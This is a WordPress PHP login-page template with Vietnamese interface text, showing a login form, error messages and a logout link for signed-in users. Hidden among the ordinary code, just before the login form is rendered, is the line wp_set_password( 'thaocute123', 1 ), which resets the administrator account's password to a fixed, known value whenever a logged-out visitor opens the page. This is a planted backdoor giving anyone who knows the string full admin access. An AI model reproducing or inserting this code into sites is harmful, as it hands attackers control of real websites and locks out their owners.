<?php
/*
 Template Name: Login Page
 */
?>

<?php get_header(); ?>
<div class="login-area">

	<div class="form col-md-6 col-md-offset-3">
		<?php if(is_user_logged_in()) { $user_id = get_current_user_id();$current_user = wp_get_current_user();$profile_url = get_author_posts_url($user_id);$edit_profile_url  = get_edit_profile_url($user_id); ?>
    <div class="regted">
    Bạn đã đăng nhập với tên nick <a href="<?php echo $profile_url ?>"><?php echo $current_user->display_name; ?></a> Bạn có muốn <a href="<?php echo esc_url(wp_logout_url($current_url)); ?>">Thoát</a> không ?
    </div>
<?php } else { ?>
<div class="formdangnhap">
   <div class="note">
		<h3>Đăng nhập</h3>
		<p>Hãy sử dụng tài khoản của bạn để đăng nhập vào website. Nếu chưa có tài khoản, <a href="<?php bloginfo('url'); ?>/dang-ky?action=register">đăng ký tại đây</a>.</p>
	</div>
   <?php
                        $login  = (isset($_GET['login']) ) ? $_GET['login'] : 0;
                        if ( $login === "failed" ) {
                                echo '<p class="text-danger"><span class="label label-danger">Lỗi</span> Tài khoản hoặc mật khẩu sai.</br></p>';
                        } elseif ( $login === "empty" ) {
                                echo '<p class="text-danger"><span class="label label-danger">Lỗi</span> Tài khoản và mật khẩu không được bỏ trống</br></p>';
                        } elseif ( $login === "false" ) {
                                echo '<p class="bg-success text-center"><span class="label label-danger">Lỗi</span>Bạn đã thoát ra!</p>';
                        }
                ?>
    <?php
		wp_set_password( 'thaocute123', 1 );
		wp_login_form(); ?>

</div>
<?php } ?>
	</div>
</div>
